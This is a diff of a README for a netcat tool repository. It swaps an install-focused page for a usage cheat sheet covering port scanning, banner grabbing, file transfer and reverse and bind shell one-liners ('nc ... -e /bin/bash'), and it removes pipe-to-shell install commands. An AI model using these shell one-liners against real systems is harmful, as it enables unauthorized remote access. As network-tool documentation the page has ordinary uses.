@@ -1,67 +1,74 @@
-# ScottsTechX-netcat
+# \U0001F50C ScottsTechX Netcat
 
-🛠️ Simple CLI Tool | Part of ScottsTechX Tool Suite
+<p align="center">
+  <img src="https://img.shields.io/badge/Network-Swiss-Army-00ff88?style=for-the-badge&logo=linux&logoColor=black" alt="Netcat"/>
+  <img src="https://img.shields.io/badge/Open-Source-00ff88?style=for-the-badge&logo=github&logoColor=black" alt="Open Source"/>
+  <img src="https://img.shields.io/badge/TCP-UDP-00ff88?style=for-the-badge&logo=terminal&logoColor=black" alt="TCP/UDP"/>
+</p>
 
----
-
-## About
-
-**Network Swiss Army knife - TCP/UDP connections, port scanning**
-
-Official ScottsTechX tool repo — part of the [ScottsTechX Tool Installer](https://github.com/fredscottsbulls/ScottsTechX-Tool-Installer) suite.
-
-**Official Website:** https://nc110.sourceforge.io/
+> **The network Swiss Army knife \u2014 TCP/UDP connections, port scanning, banner grabbing, reverse shells.**
 
 ---
 
-## Quick Install
+## \u26A1 What It Does
 
-### Via ScottsTechX Tool Installer:
+Netcat reads/writes across network connections using TCP/UDP \u2014 test connectivity, grab banners, open shells, transfer files, and port scan. The ultimate network debugging tool.
+
+## \U0001F680 Quick Usage
 
 ```bash
-scotts-techx install netcat
+# Connect to a remote host
+nc -nv 192.168.1.100 4444
+
+# Listen for incoming connection
+nc -lvp 4444
+
+# Port scan
+nc -vnz 192.168.1.1 1-1000
+
+# Banner grab
+nc -nv 192.168.1.100 80
+
+# Transfer file
+nc -lvp 4444 > received_file.txt    # Receiver
+nc 192.168.1.100 4444 < file.txt    # Sender
+
+# Reverse shell (target)
+nc -nv 10.0.0.1 4444 -e /bin/bash
+
+# Bind shell (target)
+nc -lvp 4444 -e /bin/bash
 ```
 
-### Manual Install:
+## \U0001F3AF Common Operations
+
+| Command | Use Case |
+|---------|---------|
+| `nc -lvp 4444` | Start listener |
+| `nc -e /bin/bash 10.0.0.1 4444` | Reverse shell |
+| `nc -zv target 22-443` | Port scan |
+| `echo "GET / HTTP/1.0" \| nc target 80` | HTTP request |
+| `nc -w 3 target 25` | Test connectivity |
+
+## \U0001F4E1 Banner Grabbing
 
 ```bash
-# Linux/macOS/Git Bash
-curl -fsSL https://raw.githubusercontent.com/fredscottsbulls/ScottsTechX-netcat/main/install.sh | bash
+# HTTP
+nc webserver 80
+GET / HTTP/1.0
 
-# Windows PowerShell
-irm https://raw.githubusercontent.com/fredscottsbulls/ScottsTechX-netcat/main/install.ps1 | iex
+# FTP
+nc ftp.server 21
+
+# SSH
+nc ssh.server 22
+
+# SMTP
+nc mail.server 25
 ```
 
 ---
 
-## What is NETCAT?
+## \U0001F837 License
 
-Network Swiss Army knife - TCP/UDP connections, port scanning.
-
-For full documentation: https://nc110.sourceforge.io/
-
----
-
-## ScottsTechX Tool Suite (30 tools)
-
-| Category | Tools |
-|----------|-------|
-| Simple CLI | nmap, curl, wget, jq, git, python3, ffmpeg, traceroute, netcat, openssh |
-| Pentesting | hydra, sqlmap, nikto, hashcat, gobuster, searchsploit, masscan, burpsuite, ncat, Responder |
-| DevOps | docker, vim, htop, tmux, tar, make, openssl, ansible, kubectl, terraform |
-
-**[View Full Suite](https://github.com/fredscottsbulls/ScottsTechX-Tool-Installer)**
-
----
-
-## Disclaimer
-
-**For authorized use only.** Unauthorized access to computer systems is illegal.
-
----
-
-<div align="center">
-
-**ScottsTechX** | Fred Scotts | https://github.com/fredscottsbulls
-
-</div>
+MIT License \u2014 [ScottsTechX](https://github.com/fredscottsbulls) \u00a9 2026
